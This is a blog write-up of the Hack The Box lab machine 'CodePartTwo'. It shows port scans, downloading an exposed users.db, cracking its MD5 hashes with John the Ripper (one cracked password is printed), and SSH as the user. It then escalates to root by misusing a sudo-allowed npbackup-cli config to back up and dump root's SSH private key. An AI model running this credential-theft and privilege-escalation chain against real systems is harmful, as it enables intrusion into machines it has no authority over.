---
layout: page
title: CodePartTwo
description: Exfilitrated Exposed Users Database.
img: 
importance: 4
category: HackTheBox
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/logo.png" title="HTB CodePartTwo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://app.hackthebox.com/machines/CodePartTwo">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
I don't know about you but it is time to tackle CodePartTwo. 

The first step is always to run nmap and identify those services.

{% capture nmap %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.82
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 01:21 AEDT
Nmap scan report for 10.10.11.82
Host is up (0.33s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodePartTwo
8001/tcp open  http    SimpleHTTPServer 0.6 (Python 3.8.10)
|_http-title: Directory listing for /
|_http-server-header: SimpleHTTP/0.6 Python/3.8.10
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   427.84 ms 10.10.16.1
2   195.34 ms 10.10.11.82

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.34 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmap %}

<br />
Run nmap against all of the ports to try to find unusual services.

{% capture nmapfull %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.82
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 01:13 AEDT
Nmap scan report for 10.10.11.82
Host is up (0.39s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
8001/tcp open  vcom-tunnel

Nmap done: 1 IP address (1 host up) scanned in 1507.35 seconds
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=nmapfull %}

<br />
Curl the webserver running on port 8000 with the `-I` option to get the headers and try to identify technology.

{% capture curli8000 %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ curl -I http://10.10.11.82:8000
HTTP/1.1 200 OK
Server: gunicorn/20.0.4
Date: Wed, 15 Oct 2025 14:26:34 GMT
Connection: close
Content-Type: text/html; charset=utf-8
Content-Length: 2212
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli8000 %}

<br />
Curl the webserver running on port 8001 with the `-I` option to get the headers and try to identify technology

{% capture curli8001 %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ curl -I http://10.10.11.82:8001
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.8.10
Date: Wed, 15 Oct 2025 14:26:41 GMT
Content-type: text/html; charset=utf-8
Content-Length: 338
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=curli8001 %}

<br />
Checked the landing page that is running on port 8000.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/landingpage8000.png" title="Landing Page 8000" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Also, check the landing page that is running on port 8001.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/landingpage8001.png" title="Landing Page 8001" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the users.db database from the index.

{% capture downloaddb %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ wget http://10.10.11.82:8001/users.db                    
--2025-10-16 01:29:58--  http://10.10.11.82:8001/users.db
Connecting to 10.10.11.82:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16384 (16K) [application/octet-stream]
Saving to: ‘users.db’

users.db                                                   100%[========================================================================================================================================>]  16.00K  42.0KB/s    in 0.4s    

2025-10-16 01:29:59 (42.0 KB/s) - ‘users.db’ saved [16384/16384]
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloaddb %}

<br />
Open the db in SqliteBrowswer.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/opendb.png" title="Open DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Browse the data in user table.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/usertable.png" title="User Table" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save the password to a file.

{% capture password %}
marco:649c9d65a206a75f5abe509fe128bce5
app:a97588c0e2fa3a024876339e27aeb42e
{% endcapture %}
{% include codebox.html title="passwords.txt" content=password %}

<br />
Identify the type of hash.

{% capture hashid %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ hash-identifier 
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 649c9d65a206a75f5abe509fe128bce5

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=downloaddb %}

<br />
Use john the ripper to try crack the passwords.

{% capture hashid %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
sweetangelbabylove (marco)     
1g 0:00:00:01 DONE (2025-10-17 01:32) 0.9803g/s 14062Kp/s 14062Kc/s 17443KC/s  fuckyooh21..*7¡Vamos!
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=hashid %}

<br />
Ssh into the machine as marco.

{% capture sshmarco %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ ssh marco@10.129.1.238                   
The authenticity of host '10.129.1.238 (10.129.1.238)' can't be established.
ED25519 key fingerprint is: SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.1.238' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
marco@10.129.1.238's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 16 Jan 2026 11:23:05 AM UTC

  System load:           0.01
  Usage of /:            57.4% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             223
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.238
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Fri Jan 16 11:23:07 2026 from 10.10.14.120
marco@codeparttwo:~$
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshmarco %}

<br />
Run sudo `-l` to see the command the user can run as sudo.

{% capture sshmarco %}
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sshmarco %}

<br />
Run the command in the sudo list to see what it does.

{% capture sudorun %}
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
2026-01-16 11:25:32,344 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-16 11:25:32,344 :: CRITICAL :: Cannot run without configuration file.
2026-01-16 11:25:32,350 :: INFO :: ExecTime = 0:00:00.009767, finished, state is: critical.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=sudorun %}

<br />
Get the user.txt flag.

{% capture userflag %}
marco@codeparttwo:~$ cat user.txt 
<redacted>
marco@codeparttwo:~$ ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 3267sec preferred_lft 3267sec
    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
       valid_lft 86396sec preferred_lft 14396sec
    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Run ls to try and find the config file that the error specifies.

{% capture lsconfig %}
marco@codeparttwo:~$ ls -la
total 44
drwxr-x--- 6 marco marco 4096 Jan 16 11:15 .
drwxr-xr-x 4 root  root  4096 Jan  2  2025 ..
drwx------ 7 root  root  4096 Apr  6  2025 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3771 Feb 25  2020 .bashrc
drwx------ 2 marco marco 4096 Apr  6  2025 .cache
drwxrwxr-x 4 marco marco 4096 Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 root  root  2893 Jun 18  2025 npbackup.conf
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4096 Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Jan 16 10:59 user.txt
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=lsconfig %}

<br />
Make a copy of the file just in case we make mistakes we can revert.

{% capture versionsnap %}
marco@codeparttwo:~$ cp npbackup.conf npbackup.conf.orig
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=versionsnap %}

<br />
View the config file.

{% capture configfile %}
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /home/app/app/
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
{% endcapture %}
{% include codebox.html title="npbackup.conf" content=configfile %}

<br />
Update the config file to point to root.

{% capture updateroot %}

<snip>

backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0

<snip>

{% endcapture %}
{% include terminal.html language='bash' title='bash' content=updateroot %}

<br />
Try running the back with the updated config file to see what happens.

{% capture runrootupdate %}
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
2026-01-16 11:56:22,423 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-16 11:56:22,462 :: INFO :: Loaded config E1057128 in /home/marco/npbackupone.conf
2026-01-16 11:56:22,478 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2026-01-16 11:56:25,057 :: INFO :: Snapshots listed successfully
2026-01-16 11:56:25,059 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2026-01-16 11:56:25,059 :: INFO :: Runner took 2.58131 seconds for has_recent_snapshot
2026-01-16 11:56:25,059 :: INFO :: Running backup of ['/root'] to repo default
2026-01-16 11:56:26,286 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2026-01-16 11:56:26,287 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2026-01-16 11:56:26,287 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2026-01-16 11:56:26,288 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2026-01-16 11:56:26,288 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2026-01-16 11:56:26,288 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.886 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 3bdb1df9 saved
2026-01-16 11:56:27,691 :: INFO :: Backend finished with success
2026-01-16 11:56:27,694 :: INFO :: Processed 197.7 KiB of data
2026-01-16 11:56:27,695 :: ERROR :: Backup is smaller than configured minmium backup size
2026-01-16 11:56:27,695 :: ERROR :: Operation finished with failure
2026-01-16 11:56:27,696 :: INFO :: Runner took 5.219378 seconds for backup
2026-01-16 11:56:27,696 :: INFO :: Operation finished
2026-01-16 11:56:27,702 :: INFO :: ExecTime = 0:00:05.282347, finished, state is: errors.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runrootupdate %}

<br />
Remove the minimum sizes and excludes to remove all the errors.

{% capture runrootupdate %}
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri: 
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password: 
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runrootupdate %}

<br />
Run it again.  Success!

{% capture runrootupdate %}
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --backup
2026-01-16 12:00:20,778 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-16 12:00:20,814 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
2026-01-16 12:00:20,833 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2026-01-16 12:00:23,092 :: INFO :: Snapshots listed successfully
2026-01-16 12:00:23,093 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2026-01-16 12:00:23,094 :: INFO :: Runner took 2.260862 seconds for has_recent_snapshot
2026-01-16 12:00:23,094 :: INFO :: Running backup of ['/root'] to repo default
2026-01-16 12:00:24,233 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.886 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 41bf05ef saved
2026-01-16 12:00:25,300 :: INFO :: Backend finished with success
2026-01-16 12:00:25,302 :: INFO :: Processed 197.7 KiB of data
2026-01-16 12:00:25,302 :: INFO :: Operation finished with success
2026-01-16 12:00:25,303 :: INFO :: Runner took 4.471793 seconds for backup
2026-01-16 12:00:25,303 :: INFO :: Operation finished
2026-01-16 12:00:25,309 :: INFO :: ExecTime = 0:00:04.534965, finished, state is: warnings.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=runrootupdate %}

<br />
Run ls to view all the files in root.

{% capture viewroot %}
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --ls
2026-01-16 12:00:58,351 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2026-01-16 12:00:58,380 :: INFO :: Loaded config A956ECA9 in /home/marco/npbackupone.conf
2026-01-16 12:00:58,391 :: INFO :: Showing content of snapshot latest in repo default
2026-01-16 12:01:01,172 :: INFO :: Successfully listed snapshot latest content:
snapshot 41bf05ef of [/root] at 2026-01-16 12:00:24.24741156 +0000 UTC by root@codeparttwo filtered by []:
/root
/root/.bash_history
/root/.bashrc
/root/.cache
/root/.cache/motd.legal-displayed
/root/.local
/root/.local/share
/root/.local/share/nano
/root/.local/share/nano/search_history
/root/.mysql_history
/root/.profile
/root/.python_history
/root/.sqlite_history
/root/.ssh
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/root/.vim
/root/.vim/.netrwhist
/root/root.txt
/root/scripts
/root/scripts/backup.tar.gz
/root/scripts/cleanup.sh
/root/scripts/cleanup_conf.sh
/root/scripts/cleanup_db.sh
/root/scripts/cleanup_marco.sh
/root/scripts/npbackup.conf
/root/scripts/users.db

2026-01-16 12:01:01,173 :: INFO :: Runner took 2.782473 seconds for ls
2026-01-16 12:01:01,173 :: INFO :: Operation finished
2026-01-16 12:01:01,181 :: INFO :: ExecTime = 0:00:02.833052, finished, state is: success.
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=viewroot %}

<br />
Dump the id_rsa file.

{% capture dumpidrsa %}
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c npbackupone.conf --dump /root/.ssh/id_rsa
<redacted>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=dumpidrsa %}

<br />
Create an id_rsa file on the attack machine.

{% capture transferidrsa %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ cat id_rsa 
<redacted>
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=transferidrsa %}

<br />
Chmod 600 to set the create the proper permissions on the id_rsa file.

{% capture chmodidrsa %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ chmod 600 id_rsa
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=chmodidrsa %}

<br />
Use the id_rsa file to ssh into the machine as root.

{% capture chmodidrsa %}
┌──(kali㉿kali)-[~/Documents/htb/codeparttwo]
└─$ ssh -i id_rsa root@10.129.1.238
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 16 Jan 2026 12:06:43 PM UTC

  System load:           0.0
  Usage of /:            57.6% of 5.08GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             229
  Users logged in:       1
  IPv4 address for eth0: 10.129.1.238
  IPv6 address for eth0: dead:beef::250:56ff:feb0:a99f


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Jan 16 12:06:44 2026 from 10.10.14.120
root@codeparttwo:~#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=chmodidrsa %}

<br />
Get the root.txt flag.

{% capture rootflag %}
root@codeparttwo:~# cat root.txt
<redacted>
root@codeparttwo:~# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:b0:a9:9f brd ff:ff:ff:ff:ff:ff
    inet 10.129.1.238/16 brd 10.129.255.255 scope global dynamic eth0
       valid_lft 2662sec preferred_lft 2662sec
    inet6 dead:beef::250:56ff:feb0:a99f/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:feb0:a99f/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
Crushing CodePartTwo alongside its Code Prequel.  Come back for the next box!

<br />
<h2>Trophy</h2>
<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/codeparttwo/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>